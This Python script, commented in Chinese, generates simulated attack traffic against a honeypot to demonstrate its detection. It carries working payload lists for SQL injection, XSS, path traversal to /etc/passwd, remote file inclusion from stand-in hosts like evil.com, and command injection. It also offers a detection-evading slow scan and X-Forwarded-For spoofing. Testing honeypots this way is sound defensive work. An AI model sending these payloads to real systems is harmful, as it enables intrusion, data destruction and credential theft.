#!/usr/bin/env python3
"""
蜜罐攻擊演示腳本

此腳本用於演示各種攻擊場景，展示蜜罐系統的檢測和分析能力。

注意: 僅用於授權的測試環境！不得用於實際攻擊！
"""

import requests
import time
import random
import argparse
from datetime import datetime
from typing import List, Dict
import json


class HoneypotAttackDemo:
    """蜜罐攻擊演示類"""

    def __init__(self, honeypot_url: str = "http://localhost:80", verbose: bool = True, source_ip: str = None):
        """
        初始化演示

        Args:
            honeypot_url: 蜜罐 URL
            verbose: 是否顯示詳細輸出
            source_ip: 模擬的來源 IP
        """
        self.honeypot_url = honeypot_url
        self.verbose = verbose
        self.source_ip = source_ip
        self.session = requests.Session()

        # 如果提供了 source_ip，設置到 session 的標頭中
        if self.source_ip:
            self.session.headers.update({'X-Forwarded-For': self.source_ip})
            self.log(f"所有請求將模擬來自 IP: {self.source_ip}")

        # 模擬不同的攻擊者特徵
        self.attack_profiles = {
            'sqlmap': {
                'user_agent': 'sqlmap/1.7.2#stable (http://sqlmap.org)',
                'attacks': ['sqli']
            },
            'nikto': {
                'user_agent': 'Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)',
                'attacks': ['scanner', 'path_traversal']
            },
            'xss_scanner': {
                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'attacks': ['xss']
            },
            'automated_scanner': {
                'user_agent': 'python-requests/2.31.0',
                'attacks': ['sqli', 'xss', 'lfi', 'rfi']
            },
            'advanced_attacker': {
                'user_agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
                'attacks': ['sqli', 'xss', 'cmd_exec', 'path_traversal']
            }
        }

        # 攻擊 Payload 庫
        self.payloads = {
            'sqli': [
                "' OR '1'='1",
                "admin' --",
                "1' UNION SELECT NULL, NULL, NULL--",
                "' OR 1=1--",
                "1' AND '1'='1",
                "'; DROP TABLE users--",
                "1' UNION SELECT username, password FROM users--",
                "admin'/*",
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src='javascript:alert(\"XSS\")'></iframe>",
                "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
            ],
            'lfi': [
                "../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "../../../windows/win.ini",
                "../../boot.ini",
                "/etc/passwd%00",
            ],
            'rfi': [
                "http://evil.com/shell.txt",
                "https://attacker.com/backdoor.php",
            ],
            'cmd_exec': [
                "; ls -la",
                "| whoami",
                "`id`",
                "$(cat /etc/passwd)",
                "&& netstat -an",
            ],
            'path_traversal': [
                "../",
                "..\\",
                "....//",
                "%2e%2e%2f",
            ]
        }

    def log(self, message: str, level: str = "INFO"):
        """輸出日誌"""
        if self.verbose:
            timestamp = datetime.now().strftime("%H:%M:%S")
            symbols = {
                "INFO": "[INFO]",
                "SUCCESS": "[OK]",
                "ATTACK": "[ATTACK]",
                "ERROR": "[ERROR]",
                "WAIT": "[WAIT]"
            }
            symbol = symbols.get(level, "")
            print(f"[{timestamp}] {symbol} {message}")

    def send_request(self, path: str, params: Dict = None, headers: Dict = None) -> requests.Response:
        """
        發送請求到蜜罐

        Args:
            path: URL 路徑
            params: 查詢參數
            headers: 請求頭

        Returns:
            Response 對象
        """
        url = f"{self.honeypot_url}{path}"
        try:
            response = self.session.get(url, params=params, headers=headers, timeout=10)
            return response
        except requests.exceptions.RequestException as e:
            self.log(f"請求失敗: {e}", "ERROR")
            return None

    def simulate_sql_injection(self, num_requests: int = 5):
        """模擬 SQL 注入攻擊"""
        self.log("開始 SQL 注入攻擊演示", "ATTACK")

        paths = [
            "/login.php",
            "/admin.php",
            "/user.php",
            "/search.php",
            "/product.php"
        ]

        for i in range(num_requests):
            path = random.choice(paths)
            payload = random.choice(self.payloads['sqli'])
            params = {
                'id': payload,
                'username': payload if random.random() > 0.5 else 'admin',
                'search': payload
            }

            self.log(f"SQL 注入 [{i+1}/{num_requests}]: {path}?id={payload[:30]}...", "ATTACK")
            self.send_request(path, params=params, headers={
                'User-Agent': self.attack_profiles['sqlmap']['user_agent']
            })

            time.sleep(random.uniform(0.1, 0.5))

    def simulate_xss_attack(self, num_requests: int = 5):
        """模擬 XSS 跨站腳本攻擊"""
        self.log("開始 XSS 攻擊演示", "ATTACK")

        paths = [
            "/search.php",
            "/comment.php",
            "/profile.php",
            "/message.php"
        ]

        for i in range(num_requests):
            path = random.choice(paths)
            payload = random.choice(self.payloads['xss'])
            params = {
                'q': payload,
                'name': payload if random.random() > 0.5 else 'hacker',
                'comment': payload
            }

            self.log(f"XSS 攻擊 [{i+1}/{num_requests}]: {path}?q={payload[:30]}...", "ATTACK")
            self.send_request(path, params=params, headers={
                'User-Agent': self.attack_profiles['xss_scanner']['user_agent']
            })

            time.sleep(random.uniform(0.1, 0.5))

    def simulate_path_traversal(self, num_requests: int = 5):
        """模擬目錄遍歷攻擊"""
        self.log("開始目錄遍歷攻擊演示", "ATTACK")

        for i in range(num_requests):
            lfi_payload = random.choice(self.payloads['lfi'])
            params = {
                'file': lfi_payload,
                'page': lfi_payload,
                'include': lfi_payload
            }

            self.log(f"目錄遍歷 [{i+1}/{num_requests}]: file={lfi_payload}", "ATTACK")
            self.send_request("/index.php", params=params, headers={
                'User-Agent': self.attack_profiles['nikto']['user_agent']
            })

            time.sleep(random.uniform(0.1, 0.5))

    def simulate_scanner_behavior(self, num_requests: int = 10):
        """模擬自動化掃描器行為"""
        self.log("開始掃描器行為演示", "ATTACK")

        # 常見的掃描路徑
        scanner_paths = [
            "/admin/",
            "/phpMyAdmin/",
            "/wp-admin/",
            "/.git/config",
            "/.env",
            "/config.php",
            "/backup.sql",
            "/database.sql",
            "/robots.txt",
            "/.htaccess",
            "/server-status",
            "/phpinfo.php",
            "/test.php",
            "/shell.php",
            "/upload.php"
        ]

        for i in range(num_requests):
            path = random.choice(scanner_paths)
            self.log(f"掃描 [{i+1}/{num_requests}]: {path}", "ATTACK")
            self.send_request(path, headers={
                'User-Agent': self.attack_profiles['automated_scanner']['user_agent']
            })

            time.sleep(random.uniform(0.05, 0.2))

    def simulate_command_injection(self, num_requests: int = 5):
        """模擬命令注入攻擊"""
        self.log("開始命令注入攻擊演示", "ATTACK")

        paths = [
            "/ping.php",
            "/system.php",
            "/exec.php",
            "/cmd.php"
        ]

        for i in range(num_requests):
            path = random.choice(paths)
            payload = random.choice(self.payloads['cmd_exec'])
            params = {
                'cmd': payload,
                'host': f"127.0.0.1{payload}",
                'ip': f"localhost{payload}"
            }

            self.log(f"命令注入 [{i+1}/{num_requests}]: {path}?cmd={payload[:30]}...", "ATTACK")
            self.send_request(path, params=params, headers={
                'User-Agent': self.attack_profiles['advanced_attacker']['user_agent']
            })

            time.sleep(random.uniform(0.1, 0.5))

    def simulate_combined_attack(self, duration: int = 30):
        """
        模擬混合型攻擊（更真實的場景）

        Args:
            duration: 攻擊持續時間（秒）
        """
        self.log(f"開始混合型攻擊演示（持續 {duration} 秒）", "ATTACK")

        start_time = time.time()
        attack_count = 0

        attack_methods = [
            self.simulate_sql_injection,
            self.simulate_xss_attack,
            self.simulate_path_traversal,
            self.simulate_scanner_behavior,
            self.simulate_command_injection
        ]

        while time.time() - start_time < duration:
            # 隨機選擇攻擊類型
            attack = random.choice(attack_methods)
            num_requests = random.randint(2, 5)

            attack(num_requests)
            attack_count += num_requests

            # 隨機暫停（模擬真實攻擊者的行為）
            time.sleep(random.uniform(1, 3))

        elapsed = time.time() - start_time
        self.log(f"混合攻擊完成！共發送 {attack_count} 個請求，耗時 {elapsed:.1f} 秒", "SUCCESS")

    def simulate_slow_scan(self, num_requests: int = 20):
        """
        模擬緩慢掃描（規避檢測）

        Args:
            num_requests: 請求數量
        """
        self.log("開始緩慢掃描演示（規避檢測）", "ATTACK")

        paths = [
            "/",
            "/index.php",
            "/about.php",
            "/contact.php",
            "/products.php",
            "/login.php"
        ]

        for i in range(num_requests):
            path = random.choice(paths)
            payload = random.choice(self.payloads['sqli'] + self.payloads['xss'])

            params = {'id': payload} if random.random() > 0.5 else {'q': payload}

            self.log(f"緩慢掃描 [{i+1}/{num_requests}]: {path}", "ATTACK")
            self.send_request(path, params=params, headers={
                'User-Agent': self.attack_profiles['advanced_attacker']['user_agent']
            })

            # 較長的延遲（5-15秒）
            delay = random.uniform(5, 15)
            self.log(f"等待 {delay:.1f} 秒...", "WAIT")
            time.sleep(delay)

    def run_full_demo(self):
        """運行完整演示"""
        print("=" * 70)
        print("蜜罐攻擊演示腳本")
        print("=" * 70)
        print(f"目標蜜罐: {self.honeypot_url}")
        print(f"開始時間: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 70)
        print()

        demos = [
            ("SQL 注入攻擊", lambda: self.simulate_sql_injection(5)),
            ("XSS 跨站腳本", lambda: self.simulate_xss_attack(5)),
            ("目錄遍歷攻擊", lambda: self.simulate_path_traversal(5)),
            ("自動化掃描", lambda: self.simulate_scanner_behavior(10)),
            ("命令注入攻擊", lambda: self.simulate_command_injection(5)),
        ]

        for i, (name, demo_func) in enumerate(demos, 1):
            print()
            print(f"{'='*70}")
            print(f"演示 {i}/{len(demos)}: {name}")
            print(f"{'='*70}")
            demo_func()
            time.sleep(2)

        print()
        print("=" * 70)
        print("演示完成！")
        print(f"結束時間: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 70)
        print()
        print("請前往以下網址查看分析結果:")
        print("   儀表板: http://localhost:8084")
        print("   會話列表: http://localhost:8084 (點擊「會話列表」)")
        print("   告警中心: http://localhost:8084 (點擊「告警中心」)")
        print()


def main():
    """主函數"""
    parser = argparse.ArgumentParser(
        description="蜜罐攻擊演示腳本 - 用於測試和演示蜜罐系統的檢測能力",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
演示模式:
  --full              運行完整演示（所有攻擊類型）
  --sqli              僅 SQL 注入攻擊
  --xss               僅 XSS 攻擊
  --scan              僅掃描器行為
  --mixed             混合型攻擊（隨機組合）
  --slow              緩慢掃描（規避檢測）

範例:
  python demo_attack.py --full
  python demo_attack.py --sqli --count 10
  python demo_attack.py --mixed --duration 60
  python demo_attack.py --url http://localhost:80 --full

注意: 此腳本僅用於授權的測試環境！
        """
    )

    parser.add_argument('--url', default='http://localhost:80',
                        help='蜜罐 URL (預設: http://localhost:80)')
    parser.add_argument('--full', action='store_true',
                        help='運行完整演示')
    parser.add_argument('--sqli', action='store_true',
                        help='SQL 注入攻擊')
    parser.add_argument('--xss', action='store_true',
                        help='XSS 攻擊')
    parser.add_argument('--scan', action='store_true',
                        help='掃描器行為')
    parser.add_argument('--cmd', action='store_true',
                        help='命令注入攻擊')
    parser.add_argument('--path', action='store_true',
                        help='目錄遍歷攻擊')
    parser.add_argument('--mixed', action='store_true',
                        help='混合型攻擊')
    parser.add_argument('--slow', action='store_true',
                        help='緩慢掃描')
    parser.add_argument('--count', type=int, default=5,
                        help='請求數量 (預設: 5)')
    parser.add_argument('--duration', type=int, default=30,
                        help='混合攻擊持續時間（秒，預設: 30）')
    parser.add_argument('--quiet', action='store_true',
                        help='安靜模式（減少輸出）')
    parser.add_argument('--source-ip', type=str, default=None,
                        help='模擬的來源 IP 地址 (會被添加到 X-Forwarded-For 標頭)')

    args = parser.parse_args()

    demo = HoneypotAttackDemo(
        honeypot_url=args.url,
        verbose=not args.quiet,
        source_ip=args.source_ip
    )

    # 執行相應的演示
    if args.full:
        demo.run_full_demo()
    elif args.sqli:
        demo.simulate_sql_injection(args.count)
    elif args.xss:
        demo.simulate_xss_attack(args.count)
    elif args.scan:
        demo.simulate_scanner_behavior(args.count)
    elif args.cmd:
        demo.simulate_command_injection(args.count)
    elif args.path:
        demo.simulate_path_traversal(args.count)
    elif args.mixed:
        demo.simulate_combined_attack(args.duration)
    elif args.slow:
        demo.simulate_slow_scan(args.count)
    else:
        # 預設運行完整演示
        demo.run_full_demo()


if __name__ == "__main__":
    main()
